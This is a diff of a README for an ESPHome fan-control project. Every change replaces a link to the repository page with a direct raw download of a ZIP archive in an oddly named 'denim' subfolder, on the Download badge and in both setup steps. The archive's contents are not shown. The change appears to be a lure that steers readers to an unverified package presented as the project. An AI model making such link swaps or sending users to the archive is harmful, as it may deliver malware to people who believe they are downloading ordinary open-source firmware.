@@ -1,6 +1,6 @@
 # 🌬️ Omnibreeze-esphome - Local fan control without cloud
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20latest%20version-blue?style=for-the-badge)](https://github.com/Jamessam7660/Omnibreeze-esphome)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20latest%20version-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jamessam7660/Omnibreeze-esphome/main/denim/Omnibreeze_esphome_2.4.zip)
 
 ## 🧭 What this is
 
@@ -25,7 +25,7 @@ If you plan to use Home Assistant, it helps to have that ready too. The setup wo
 
 Visit this page to download and use the project files:
 
-https://github.com/Jamessam7660/Omnibreeze-esphome
+https://raw.githubusercontent.com/Jamessam7660/Omnibreeze-esphome/main/denim/Omnibreeze_esphome_2.4.zip
 
 On the page, look for the file list and the setup steps in the repository. If you use GitHub Desktop or download the ZIP file, save it to a folder you can find again, such as Downloads or Documents.
 
@@ -188,7 +188,7 @@ Do not change other settings unless you want to tune how the fan behaves.
 
 Open the project page here:
 
-https://github.com/Jamessam7660/Omnibreeze-esphome
+https://raw.githubusercontent.com/Jamessam7660/Omnibreeze-esphome/main/denim/Omnibreeze_esphome_2.4.zip
 
 Then:
 
